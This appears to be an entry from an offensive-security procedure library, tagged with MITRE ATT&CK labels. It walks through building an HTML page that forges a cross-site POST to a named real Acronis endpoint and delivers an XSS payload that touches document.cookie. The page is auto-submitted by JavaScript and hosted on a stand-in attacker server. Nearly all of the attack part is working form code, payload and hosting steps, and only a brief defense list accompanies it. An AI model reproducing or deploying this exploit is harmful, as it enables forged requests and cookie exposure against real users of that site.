---
id: build-acronis-csrf-poc-001
tags:
  - csrf
  - web
  - poc
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:55:37.663Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
---

# Build-CSRF-HTML-Page-to-Deliver-XSS-Payload

## Summary

This procedure creates an HTML page that exploits the lack of CSRF protection on the Acronis form by auto-submitting a POST request with the XSS payload when loaded in the victim's browser.

## Description

The target endpoint lacks CSRF tokens, allowing forged POSTs from external sites. This PoC uses an HTML form with hidden inputs for all parameters, including the XSS payload in 'c', and JavaScript to submit on load. When a victim visits the page, it triggers the request to the Acronis site, delivering the XSS. Host this on an attacker server; assumes victim is in a browsing context where the site is relevant.

## Requirements

1. Text editor to create the HTML file.
2. Web server to host the malicious page (e.g., local or remote).
3. Knowledge of HTML forms and JavaScript auto-submit.

## Defense

Defensive measures and detection strategies:

- Require unique CSRF tokens in all state-changing POST forms.
- Validate the token on the server side for every request.
- Use SameSite cookies to mitigate cross-site requests.

## Objectives

1. Forge a POST request mimicking the legitimate form.
2. Auto-submit without user interaction.
3. Deliver the XSS payload cross-site.

## Instructions

### Step 1: Create the HTML Structure

**Context**: Build a form with hidden fields for all parameters.

Write HTML: <form id="csrfForm" action="https://www.acronis.com/en-us/my/remind/index.html" method="POST"><input type="hidden" name="token" value="example"><input type="hidden" name="SN" value="123"><input type="hidden" name="OrderId" value="456"><input type="hidden" name="Submit" value="Send"><input type="hidden" name="c" value="1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"></form>

### Step 2: Add Auto-Submit Script

**Context**: Use JS to submit the form immediately on page load.

Add: <script>document.getElementById('csrfForm').submit();</script> after the form.

> The full page will submit the POST silently upon loading.

### Step 3: Host and Test

**Context**: Serve the page and verify it triggers the target request.

Host the HTML file on a server (e.g., python -m http.server) and visit http://attacker.com/csrf.html. Check network tab for the POST to Acronis.

> Expected output: POST request sent with payload; if tested on target, XSS triggers.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[poc]]

